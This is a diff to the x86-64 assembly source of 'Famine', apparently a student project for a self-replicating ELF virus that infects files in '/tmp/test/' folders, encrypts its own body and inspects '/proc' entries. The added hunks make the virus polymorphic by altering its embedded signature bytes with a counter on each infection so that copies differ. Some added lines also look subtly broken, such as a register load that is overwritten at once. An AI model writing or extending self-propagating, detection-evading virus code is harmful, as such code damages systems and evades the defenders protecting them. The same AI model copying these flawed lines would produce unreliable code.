@@ -188,6 +188,9 @@ DECYPHER
 	jne _exx_pop
 
 .get_rand_key:
+	lea rsi, STACK(famine.morph_sign)	; load morph iterator for signature
+	mov rsi, 0
+
 	lea rdi, [rel random]
 	mov rsi, O_RDONLY
 	mov rax, _open
@@ -427,6 +430,19 @@ inject_self:
 	mov r11b, STACK(famine.factor)
 	mov byte[r10], r11b
 
+	lea r10, STACK(famine.tocypher)
+	add r10, SIGNATURE_OFFSET
+	mov r11b, STACK(famine.morph_sign)
+	inc r11b
+	add byte[r10], r11b
+	add r10, 2
+	add byte[r10], r11b
+	add r10, 2
+	add byte[r10], r11b
+	add r10, 2
+	add byte[r10], r11b
+	add r10, 2
+	mov STACK(famine.morph_sign), r11
 
 	push r12
 	CYPHER
@@ -520,7 +536,7 @@ infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
 random			db			"/dev/random"
 enc_end:
 	db 0
-signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>', 0xa, 0x00
+signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>42424242', 0xa, 0x00
 pfile			db			"/proc/self/status",0
 pdir			db			"/proc/", 0, 0, 0, 0
 pname			db			"/comm"
